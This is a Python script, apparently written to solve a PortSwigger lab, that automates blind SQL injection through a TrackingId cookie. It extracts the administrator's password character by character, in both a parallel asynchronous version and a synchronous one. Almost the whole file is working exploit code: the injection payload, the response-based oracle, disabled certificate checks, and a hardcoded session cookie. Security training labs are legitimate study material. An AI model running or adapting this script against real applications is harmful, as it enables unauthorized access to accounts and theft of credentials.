import sys
import requests
import urllib3
import urllib
import asyncio
import aiohttp
import json 
import copy

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "https://127.0.0.1:8080"
}

password_extracted = {}

"""
Get the character for a single position.
Character is saved in the global variable "password_extracted".
"""
async def getChar(position, url, session, cookies_in):
    for j in range(32, 126):
        cookies = copy.deepcopy(cookies_in)
        #sys.stdout.write("Trying char %s at pos %s\n" % (chr(j), position))
        #sys.stdout.write("password_extracted: %s" % password_extracted)
        #sys.stdout.flush()
        sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (position, j)
        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
        cookies["TrackingId"] = cookies["TrackingId"] + sqli_payload_encoded
        #sys.stdout.write("cookie payload: %s, \nencoded cookie: %s\n" % (sqli_payload, cookies["TrackingId"]))
        sys.stdout.flush()
        async with session.get(url, cookies=cookies, ssl=False) as r:
            text = await r.text()
            if "Welcome" in text:
                sys.stdout.write("char %s at pos %s\n" % (chr(j), position))
                sys.stdout.flush()
                password_extracted[position] = chr(j)
                return

"""
Run the tasks to get the individual characters in parallel.
Using aiohttp as asynchronous http client.
"""
async def runParallel(url, cookies):
    async with aiohttp.ClientSession() as session:
        rangeNums = list(range(1, 21))
        tasks = [getChar(i, url, session, cookies) for i in rangeNums]
        await asyncio.gather(*tasks)

    password = "".join(
        password_extracted[i] for i in sorted(password_extracted)
    )
    sys.stdout.write("\npassword: %s" % password)
    sys.stdout.flush()


"""
Old synchronous version of the blind SQL Injection method.
From Rana Khalil (https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses)
"""
def sqli_password(url):
    password_extracted = ""
    for i in range(1, 21):
        for j in range(32, 126):
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i, j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {
                "TrackingId": "yFRfxYc2JYHZ0K8v" + sqli_payload_encoded,
                "session": "QEw4PHGMxLHZUCIJPVQILnpzxeWvmxLp"
            }
            sys.stdout.write("cookie payload: %s, \nencoded cookie: %s\n" % (sqli_payload, cookies["TrackingId"]))
            sys.stdout.flush()
            r = requests.get(url, cookies=cookies, verify=False)
            if "Welcome" not in r.text:
                sys.stdout.write("\r" + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write("\r" + password_extracted)
                sys.stdout.flush()
                break

"""
Load config settings from config.json
and run parallel character crack.

Config layout:
{
    "TrackingId": "<tracking_id>",
    "session": "<session>",
    "url": "<url>",
    "http_proxy": "<http_proxy>",
    "https_proxy": "<https_proxy>"
}
"""
def main():
    with open("config.json") as f:
        config = json.load(f)
        print(config)

    if(not("url" in config) or not("TrackingId" in config) or not("session" in config) or not("http_proxy" in config) or not("https_proxy" in config)):
        sys.stdout.write("(+) Use the config.json file to configure the script.\n")
        sys.stdout.write("(+) For syntax, see the github repo.\n")
        sys.stdout.flush()
        return

    url = config["url"]
    cookies = {
        "TrackingId": config["TrackingId"],
        "session": config["session"],
    }
    proxies = {
        "http": config["http_proxy"],
        "https": config["https_proxy"]
    }
    sys.stdout.write("(+) Settings: \nURL: %s\nCookies: %s\nProxies: %s\n" % (url, cookies, proxies))
    sys.stdout.write("(+) Retrieving administrator password...\n")
    sys.stdout.flush()
    asyncio.run(runParallel(url, cookies))

if __name__ == "__main__":
    main()